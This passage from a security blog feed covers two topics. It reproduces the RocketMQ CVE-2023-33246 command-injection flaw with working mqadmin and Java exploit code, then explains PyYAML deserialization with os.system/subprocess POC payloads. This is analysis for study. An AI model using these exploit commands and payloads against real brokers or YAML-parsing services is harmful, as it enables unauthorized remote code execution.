（5.1.1）</p><p>这里我们拿以前的旧版本（我是 4.9.4）去看一下 filter server 到底是什么功能点</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/filterServers.png" class><p>发现存在 <code>callShell()</code> 方法非常可疑，跟进去看一下，发现这里直接就有 <code>Runtime.getRuntime.exec()</code> 写出来了</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/runtimeExec.png" class><p>结合前面的 <code>callShell()</code> 方法，最终找到一条可以利用的调用链，因为在 RocketMQ 中，<code>startBasicService</code> 这个方法很可能是每时每刻都在进行的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BrokerController#startBasicService ——&gt; FilterServerManager#start ——&gt; FilterServerManager#createFilterServer ——&gt; FilterServerUtil#callShell</span><br></pre></td></tr></table></figure><h3 id="漏洞利用与漏洞分析"><a href="#漏洞利用与漏洞分析" class="headerlink" title="漏洞利用与漏洞分析"></a>漏洞利用与漏洞分析</h3><p>从漏洞利用角度来说很简单了，这里我们开启远程调试，并且在有 RocketMQ 的机子上开启另外一台 RocketMQ 主机来测试，因为这样可以保证控制变量，也不会有自己打自己的错觉。</p><p>通过以下命令开启另外一台 RocketMQ，这里本质上不会启动 RocketMQ 的服务，只是用一下里面的 jar 包等环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -ti apache/rocketmq:4.9.4 bash</span><br></pre></td></tr></table></figure><p>通过翻阅官方文档这里可以知道更新配置的操作是通过 <code>./mqadmin</code> 这个命令来完成的</p><p><a class="link" href="https://rocketmq.apache.org/zh/docs/4.x/deployment/02admintool/">https://rocketmq.apache.org/zh/docs/4.x/deployment/02admintool/<i class="fas fa-external-link-alt"></i></a></p><p>因为漏洞代码是走到 <code>Broker</code> 这个组件相对应的功能里面去的，所以使用 <code>./mqadmin</code> 命令后接 <code>updateBrokerConfig</code> 是我认为正确的利用姿势，先构造一个简单的 test 案例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mqadmin updateBrokerConfig -k key -v <span class="built_in">whoami</span> -n 124.222.21.138:9876</span><br></pre></td></tr></table></figure><p>但是这一个 test 案例并没有走到对应的 <code>FilterServerUtil#callShell</code> 方法里面去，但是断点里面出现了这一段内容，这也就证明了这个 <code>BrokerController</code> 是会自动运行的（因为这里 more &#x3D; 0，所以会抛出异常）</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/debugPointContent.png" class><p>这时候再回来看一看 cmd 到底是怎么构造出来的 —— 去到 <code>FilterServerManager.buildStartCommand()</code> 方法下断点调试</p><p>第一个参数是 <code>BrokerStartup.configFile</code>，也就是配置文件，第二个参数是要去更新的 NamesrvAddr，第三个参数为 rocketHome 的路径</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/threeParameters.png" class><p>这三者最终形成了 <code>String cmd = this.buildStartCommand();</code> 里的 cmd 变量，形象化地说明一下就是这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh &#123;para3&#125;/bin/startfsrv.sh -c &#123;para1&#125; -n &#123;para2&#125;</span><br></pre></td></tr></table></figure><p>所以从构造攻击的角度来说我们最好是让 <code>para3</code> 可控，构造类似于 <code>sh evil_cmd;/bin/startfsrv.sh -c &#123;para1&#125; -n &#123;para2&#125;</code> 即可达到命令执行的目的。</p><p>这里其实还有一点需要绕过，就是 <code>getFilterServerNums</code> 这里最初的值是 0，我们需要让它变成大于 0 即可，这一点其实很容易实现，还是可以通过之前的 <code>./mqadmin</code> 命令来完成。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mqadmin updateBrokerConfig -kfilterServerNums -v1 -b124<span class="number">.222</span><span class="number">.21</span><span class="number">.138</span>:<span class="number">10911</span> -n <span class="number">124.222</span><span class="number">.21</span><span class="number">.138</span>:<span class="number">9876</span></span><br></pre></td></tr></table></figure><p>如此操作之后，就能够让代码走进 <code>callShell()</code> 的逻辑</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/intoCallShell.png" class><p>并且在这里，通过 <code>cmdArray</code> 变量可以看到，确实我们需要控制 <code>para3</code> 去进行命令执行</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/intoRuntime.png" class><p>构造 EXP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mqadmin updateBrokerConfig -krocketmqHome -v<span class="string">&#x27;-c &#123;echo,dG91Y2ggL3RtcC9zdWNjZXNzCg==&#125;|&#123;base64,-d&#125;|bash -c&quot;&quot; &#x27;</span>  -b124.222.21.138:10911 -n 124.222.21.138:9876</span><br></pre></td></tr></table></figure><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/exp.png" class><p>命令执行成功！</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/rocketConfig.png" class><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/success.png" class><p>如果说需要扩大攻击面的话，我们尝试用 Java 打 RocketMQ 的 RCE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.rocketmq.tools.admin.DefaultMQAdminExt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建 Properties 对象</span></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        props.setProperty(<span class="string">&quot;rocketmqHome&quot;</span>,<span class="string">&quot;-c &#123;echo,dG91Y2ggL3RtcC9mbGFn&#125;|&#123;base64,-d&#125;|bash -c&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;filterServerNums&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建 DefaultMQAdminExt 对象并启动</span></span><br><span class="line">        <span class="type">DefaultMQAdminExt</span> <span class="variable">admin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQAdminExt</span>();</span><br><span class="line">        admin.setNamesrvAddr(<span class="string">&quot;124.222.21.138:9876&quot;</span>);</span><br><span class="line">        admin.start();</span><br><span class="line">        <span class="comment">// 更新配置⽂件</span></span><br><span class="line">        admin.updateBrokerConfig(<span class="string">&quot;124.222.21.138:10911&quot;</span>, props);</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">brokerConfig</span> <span class="operator">=</span> admin.getBrokerConfig(<span class="string">&quot;124.222.21.138:10911&quot;</span>);</span><br><span class="line">        System.out.println(brokerConfig.getProperty(<span class="string">&quot;rocketmqHome&quot;</span>));</span><br><span class="line">        System.out.println(brokerConfig.getProperty(<span class="string">&quot;filterServerNums&quot;</span>));</span><br><span class="line">        <span class="comment">// 关闭 DefaultMQAdminExt 对象</span></span><br><span class="line">        admin.shutdown();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="关于-RocketMQ-协议发包"><a href="#关于-RocketMQ-协议发包" class="headerlink" title="关于 RocketMQ 协议发包"></a>关于 RocketMQ 协议发包</h3><p>这里我用 tcpdump 抓包了，但是我还是没有特别明白，这到底是什么意思，意思是强制更新吗还是。。</p><p>通过抓包其实可以看出来也是同样的过程。这里我觉得发包其实就是做了一个强制更新的操作，从上面的漏洞分析过程可以看到，<code>sh xxx</code> 一系列的参数，在被执行时是陆陆续续的，所以我们可以通过发包来强制更新</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/wiresharkHTTP.png" class><p>后续知道其实这是需要 TCP 发包构造</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这个洞其实找到链尾就不难了</p><p>CVE-2023-33246 的命令执行方式还是挺骚的，同时我在向淚笑大师傅请教的过程中学到了非常多的东西，首先是漏洞挖掘这一块，需要多元思考，其实这个尾部命令执行的点还是挺有意思的，说不定其他很多产品也会存在这个问题。</p><p>再就是多用 docker，他搭建环境非常非常快。</p><p>最后就是如何挖洞，是要多关注官方文档的很多的功能利用的，多调试。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;发一篇库存&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Python yaml 反序列化</title>
    <link href="https://drun1baby.github.io/2023/06/02/Python-yaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://drun1baby.github.io/2023/06/02/Python-yaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-06-02T08:29:18.000Z</published>
    <updated>2023-06-02T08:38:33.621Z</updated>
    
    <content type="html"><![CDATA[<p>Python yaml 反序列化</p><span id="more"></span><h1 id="Py-Yaml-反序列化漏洞"><a href="#Py-Yaml-反序列化漏洞" class="headerlink" title="Py Yaml 反序列化漏洞"></a>Py Yaml 反序列化漏洞</h1><h2 id="Python-中的强制类型转换"><a href="#Python-中的强制类型转换" class="headerlink" title="Python 中的强制类型转换"></a>Python 中的强制类型转换</h2><ul><li>Py Yaml 的漏洞本质上是因为这一点产生的</li></ul><p>可以通过 <code>!!</code> 来进行类型转换。</p><p>通过上面的测试可以发现，如果识别到一个数字，那么按照 YAML 格式来处理，这个类型就是数字类型。如果我们想把数字类型变为字符串类型就可以这样：<code>a: !!str 1</code>，它的结果和 <code>a: &quot;1&quot;</code> 是一样的。</p><p>由于 YAML 仅仅是一种格式规范，所以理论上一个支持 YAML 的解析器可以选择性支持 YAML 的某些语法，也可以在 YAML 的基础上利用 <code>!!</code> 来扩展额外的解析能力。本文主要聚焦于 PyYAML，所以直接看源码就可以知道它在 <code>!!</code> 上做了哪些魔改。</p><p>在 <code>site-packages/yaml/constructor.py</code> 中可以看到使用了 <code>add_constructor</code> 的有 24 多个地方，这些都是用来支持基础的类型转换（带有 <code>tag:yaml.org,2002:python/</code> 的说明是 PyYAML 自定义的类型转换）</p><p>这些基础类型转换的功能非常好理解，看上面那张图即可，就不多说了，我们下面简单写一个 demo</p><p><strong>test.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test.yaml 文件内容  </span></span><br><span class="line"><span class="comment"># str: !!str 3.14     把浮点型3.14强转成str类型  </span></span><br><span class="line"><span class="comment"># int: !!int &quot;123&quot;    把字符串123强转成int类型  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># python 代码  </span></span><br><span class="line"><span class="keyword">import</span> yaml  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 项目路径  </span></span><br><span class="line">project_path = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>].split(<span class="string">&#x27;tools&#x27;</span>)[<span class="number">0</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_yaml_data</span>(<span class="params">fileDir</span>):  </span><br><span class="line">   <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">   读取 test.yaml 文件内容  </span></span><br><span class="line"><span class="string">   :param fileDir:   :return:  </span></span><br><span class="line"><span class="string">   &quot;&quot;&quot;</span>   <span class="comment"># 1、在内存里加载这个文件  </span></span><br><span class="line">   f = <span class="built_in">open</span>(fileDir, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">   <span class="comment"># 2、调用yaml读取文件  </span></span><br><span class="line">   res = yaml.load(f)  </span><br><span class="line">   <span class="keyword">return</span> res  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">   info = get_yaml_data(project_path + <span class="string">r&#x27;\test.yaml&#x27;</span>)  </span><br><span class="line">   <span class="built_in">print</span>(info)  </span><br></pre></td></tr></table></figure><p>Run test.py</p><p>我们可以调试代码，简单看一下流程与一些值，传入的参数 node 格式为</p><p>所以对于一个 <code>!!x x</code> 来说，类型转换执行的伪代码就是：<code>find_function(&quot;x&quot;)(x)</code>。这个也很好理解。</p><h3 id="高级类型转换"><a href="#高级类型转换" class="headerlink" title="高级类型转换"></a>高级类型转换</h3><p>在理解了基础的类型转换之后，查看源码可以发现还有一个 <code>add_multi_constructor</code> 函数，一共有 5 个：</p><ul><li><code>python/name</code></li><li><code>python/module</code></li><li><code>python/object</code></li><li><code>python/object/new</code></li><li><code>python/object/apply</code></li></ul><p>从上面那张图可以看到，这几个都可以引入新的模块。这就是 PyYAML 存在反序列化的本质原因。</p><ul><li>用 Pycharm 来安装两个 Py Yaml 版本，先从 Py Yaml &lt; 5.1 的版本说起</li></ul><h2 id="PyYaml-lt-5-1-的序列化与反序列化"><a href="#PyYaml-lt-5-1-的序列化与反序列化" class="headerlink" title="PyYaml &lt; 5.1 的序列化与反序列化"></a>PyYaml &lt; 5.1 的序列化与反序列化</h2><p>在 Python 中的 PyYAML 库中提供这几种方式实现 Python 和 Yaml 这两种语言的转换。</p><p><strong>yaml -&gt; python</strong> 使用的方法是 <code>yaml.dump</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yaml.dump(data)</span><br></pre></td></tr></table></figure><p><code>dump()</code> 方法将 Python 对象 <code>data</code> 转换为 YAML 格式的方法，<code>data</code> 是一个 Python 对象，可以是字典、列表、元组、整数、浮点数、字符串、布尔值等基本数据类型，也可以是自定义的类的实例。</p><p>举个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml  </span><br><span class="line">  </span><br><span class="line">data = &#123;  </span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;John&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="number">30</span>,  </span><br><span class="line">    <span class="string">&#x27;is_student&#x27;</span>: <span class="literal">True</span>,  </span><br><span class="line">    <span class="string">&#x27;hobbies&#x27;</span>: [<span class="string">&#x27;reading&#x27;</span>, <span class="string">&#x27;swimming&#x27;</span>, <span class="string">&#x27;traveling&#x27;</span>],  </span><br><span class="line">    <span class="string">&#x27;address&#x27;</span>: &#123;  </span><br><span class="line">        <span class="string">&#x27;street&#x27;</span>: <span class="string">&#x27;123 Main St&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Anytown&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;state&#x27;</span>: <span class="string">&#x27;CA&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;zip&#x27;</span>: <span class="string">&#x27;12345&#x27;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">yaml_data = yaml.dump(data)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(yaml_data)</span><br></pre></td></tr></table></figure><p>输出结果：</p><p>在这个代码中，我们定义了一个 Python 字典 <code>data</code>，然后使用 <code>yaml.dump</code> 方法将 <code>data</code> 对象转换为 YAML 格式，并将其赋值给变量 <code>yaml_data</code>。最后，我们打印 <code>yaml_data</code>，输出转换后的 YAML 格式数据。</p><p>其实通俗点来说，就是将 Python 的对象实例转化为 YAML 格式的字符串，也就是<strong>序列化</strong>。</p><h3 id="深入挖掘-Py-YAML-序列化与反序列化"><a href="#深入挖掘-Py-YAML-序列化与反序列化" class="headerlink" title="深入挖掘 Py YAML 序列化与反序列化"></a>深入挖掘 Py YAML 序列化与反序列化</h3><ul><li>其实 Py YAML 并不是只有一个 <code>yaml.load()</code> 一个反序列化的方法</li></ul><p>&lt;5.1 版本中提供了几个方法用于解析 YAML：</p><ol><li><code>yaml.load</code>：加载单个 YAML 配置</li><li><code>yaml.load_all</code>：加载多个 YAML 配置</li></ol><p>以上这两种均可以通过 <code>Loader</code> 参数来指定加载器。一共有三个加载器，加载器后面对应了三个不同的构造器：</p><ol><li><code>BaseConstructor</code>：最最基础的构造器，不支持强制类型转换</li><li><code>SafeConstructor</code>：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改</li><li><code>Constructor</code>：在 YAML 规范上新增了很多强制类型转换</li></ol><p><code>Constructor</code> 这个是最危险的构造器，却是默认使用的构造器。</p><p>所有的 <code>construct_python_xxx()</code> 所有方法都调用了 <code>constructor()</code> 方法，这让我想起来 CVE-2018-1284 这个洞，大致上差不多。</p><p>我们可以先用这个 EXP 调试看一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml  </span><br><span class="line">  </span><br><span class="line">poc = <span class="string">&#x27;!!python/object/new:os.system [&quot;calc.exe&quot;]&#x27;</span>  </span><br><span class="line"><span class="comment">#给出一些相同用法的POC  </span></span><br><span class="line"><span class="comment">#poc = &#x27;!!python/object/new:subprocess.check_output [[&quot;calc.exe&quot;]]&#x27;  </span></span><br><span class="line"><span class="comment">#poc = &#x27;!!python/object/new:os.popen [&quot;calc.exe&quot;]&#x27;  </span></span><br><span class="line"><span class="comment">#poc = &#x27;!!python/object/new:subprocess.run [&quot;calc.exe&quot;]&#x27;  </span></span><br><span class="line"><span class="comment">#poc = &#x27;!!python/object/new:subprocess.call [&quot;calc.exe&quot;]&#x27;  </span></span><br><span class="line"><span class="comment">#poc = &#x27;!!python/object/new:subprocess.Popen [&quot;calc.exe&quot;]&#x27;  </span></span><br><span class="line">  </span><br><span class="line">yaml.load(poc)</span><br></pre></td></tr></table></figure><p>到 <code>make_python_instance()</code> 的调用栈如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">make_python_instance, constructor.py:<span class="number">552</span></span><br><span class="line">construct_python_object_apply, constructor.py:<span class="number">606</span></span><br><span class="line">construct_python_object_new, constructor.py:<span class="number">617</span></span><br><span class="line">construct_object, constructor.py:<span class="number">88</span></span><br><span class="line">construct_document, constructor.py:<span class="number">41</span></span><br><span class="line">get_single_data, constructor.py:<span class="number">37</span></span><br><span class="line">load, __init__.py:<span class="number">72</span></span><br><span class="line">&lt;module&gt;, EXP.py:<span class="number">11</span></span><br></pre></td></tr></table></figure><p>中间的调用栈也很简单，这里不再赘述，直接看漏洞触发点，其实是从 <code>find_python_name()</code> 方法中开始被调用</p><p>跟进 <code>find_python_name()</code> 方法，里面触发点是在 <code>__import__</code> 上，在 SSTI 里面我们就会用到 <code>__import__</code> 来导入恶意类，从而实现漏洞攻击。</p><p>利用成功</p><p><strong>针对!!python&#x2F;module标签</strong></p><p>这个标签对应的是源码中的 <code>construct_python_module</code>，针对这个标签的利用方法和前两个不同，它没有调用逻辑，但是再搭配任意文件上传有奇效。</p><p>首先写入执行目录，yaml 中指定同名模块，例如上传一段恶意代码，叫 <code>exp.py</code>，然后通过 <code>yaml.load(&#39;!!python/module:exp&#39;)</code> 加载。</p><p>在实际的场景中，由于一般用于存放上传文件的目录和执行目录并不是同一个，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.py  </span><br><span class="line">uploads  </span><br><span class="line">|_ user.png  </span><br><span class="line">|_ header.jpg</span><br></pre></td></tr></table></figure><p>这个时候只需要上传一个 .py 文件，这个文件会被放在 uploads 下，这时只需要触发 <code>import uploads.header</code> 就可以利用了：</p><p>接着运行 <code>python3 app.py</code> 即可</p><h2 id="PyYaml-gt-x3D-5-1-的序列化与反序列化"><a href="#PyYaml-gt-x3D-5-1-的序列化与反序列化" class="headerlink" title="PyYaml &gt;&#x3D; 5.1 的序列化与反序列化"></a>PyYaml &gt;&#x3D; 5.1 的序列化与反序列化</h2><p>大部分东西是一样的，区别在于 PyYaml &gt;&#x3D; 5.1 的时候，它并不是以 <code>Constructor</code> 作为默认使用的构造器。所以我们在请求的时候，是需要加上 <code>Loader</code> 这个参数的</p><p>这里说明一下 PyYaml &gt;&#x3D; 5.1 都有哪些加载器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BaseLoader：不支持强制类型转换</span><br><span class="line">SafeLoader：安全地加载 YAML 格式的数据，限制被加载的 YAML 数据中可用的 Python 对象类型，从而防止执行危险的操作或代码。</span><br><span class="line">FullLoader：加载包含任意 Python 对象的 YAML 数据，FullLoader 加载器不会限制被加载的 YAML 数据中可用的 Python 对象类型，因此可以加载包含任意 Python 对象的 YAML 数据。</span><br><span class="line">UnsafeLoader：加载包含任意 Python 对象的 YAML 数据，并且不会对被加载的 YAML 数据中可用的 Python 对象类型进行任何限制。</span><br></pre></td></tr></table></figure><ul><li>从加载器里面就可以比较明显得看出来，如果要进行漏洞挖掘的话，一定是从下面三个加载器去做文章，其中第二个 <code>SafeLoader</code> 需要我们去找 bypass 的方法，而剩下两个，则是寻找能利用的方法。</li></ul><p>在 PyYaml &gt;&#x3D; 5.1的版本之后，Fullloader 这个加载器对于 payload 的限制比较多了，我们延用PyYaml 的 poc 还是可以的，只不过要修改一下。</p><p>我们还可以利用 python 内置的 builtins 模块(因为之前我们审计 constructor.py 时，发现定义的find_python_name() 中，如果不用”.”将模块名和对象名分开，会默认调用 builtins 模块)</p><h4 id="1-沿用-PyYaml-lt-x3D-5-1-的-poc"><a href="#1-沿用-PyYaml-lt-x3D-5-1-的-poc" class="headerlink" title="1.沿用 PyYaml&lt;&#x3D;5.1 的 poc"></a>1.沿用 PyYaml&lt;&#x3D;5.1 的 poc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> yaml <span class="keyword">import</span> *</span><br><span class="line">poc= <span class="string">b&quot;&quot;&quot;!!python/object/apply:os.system</span></span><br><span class="line"><span class="string">- calc&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#subprocess.check_output</span></span><br><span class="line"><span class="comment">#os.popen</span></span><br><span class="line"><span class="comment">#subprocess.run</span></span><br><span class="line"><span class="comment">#subprocess.call</span></span><br><span class="line"><span class="comment">#subprocess.Popen</span></span><br><span class="line"></span><br><span class="line">yaml.load(poc,Loader=Loader)</span><br></pre></td></tr></table></figure><h4 id="2-利用-builtins-模块中的内置函数"><a href="#2-利用-builtins-模块中的内置函数" class="headerlink" title="2.利用 builtins 模块中的内置函数"></a>2.利用 builtins 模块中的内置函数</h4><p>首先，我们先明确 builtins 中的所有的类，从而筛选出可以利用的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">builtin_classes = []</span><br><span class="line"><span class="keyword">for</span> obj_name <span class="keyword">in</span> <span class="built_in">dir</span>(builtins):</span><br><span class="line">    obj = <span class="built_in">getattr</span>(builtins, obj_name)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">type</span>):</span><br><span class="line">        builtin_classes.append(obj)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(builtin_classes)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;ArithmeticError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;AssertionError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;AttributeError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;BaseException&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;BaseExceptionGroup&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;BlockingIOError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;BrokenPipeError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;BufferError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;BytesWarning&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ChildProcessError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionAbortedError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionRefusedError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionResetError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;DeprecationWarning&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;EOFError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;EncodingWarning&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;Exception&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ExceptionGroup&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;FileExistsError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;FileNotFoundError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;FloatingPointError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;FutureWarning&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;GeneratorExit&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span 